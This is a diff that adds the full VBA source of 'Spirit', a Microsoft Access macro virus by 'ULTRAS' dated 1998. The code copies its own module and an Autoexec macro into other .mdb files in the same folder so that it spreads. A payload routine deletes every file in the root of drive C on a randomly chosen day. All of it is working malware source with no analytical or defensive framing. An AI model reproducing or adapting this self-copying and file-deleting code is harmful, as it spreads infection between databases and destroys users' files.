@@ -1,0 +1,39 @@
+   Attribute VB_Name = "Spirit"
+
+   '  Access Macro Generator by ULTRAS
+   '          Version 1.0
+
+   'Virus Name: Spirit
+   'Virus Author: ULTRAS
+   '04.11.98 18:20:00
+
+   Option Compare Database
+   Option Explicit
+
+   Function amg()
+   On Error Resume Next
+   Dim Fname, Virii, CBase As String
+   Virii = False
+   Fname = Dir("*.mdb", vbNormal)
+   If Fname <> "" Then
+   CBase = CurrentDb.Name
+   If CBase = Fname Then Virii = True
+   If Virii = False Then Application.DoCmd.TransferDatabase acExport, "Microsoft Access", Fname, acModule, "Spirit", "Spirit"
+   If Virii = False Then Application.DoCmd.TransferDatabase acExport, "Microsoft Access", Fname, acMacro, "Autoexec", "Autoexec "
+   While Fname <> ""
+   Fname = Dir
+   If CBase = Fname Then Virii = True
+   If Virii = False Then Application.DoCmd.TransferDatabase acExport, "Microsoft Access", Fname, acModule, "Spirit", "Spirit"
+   If Virii = False Then Application.DoCmd.TransferDatabase acExport, "Microsoft Access", Fname, acMacro, "Autoexec", "Autoexec "
+   Wend
+   Call Payload
+   End If
+   End Function
+
+   Sub Payload()
+   On Error Resume Next
+   If Day(Now()) = Int(Rnd() * 30) + 1 Then
+   'Spirit by ULTRAS [SOS]
+   Kill "C:\*.*"
+   End If
+   End Sub
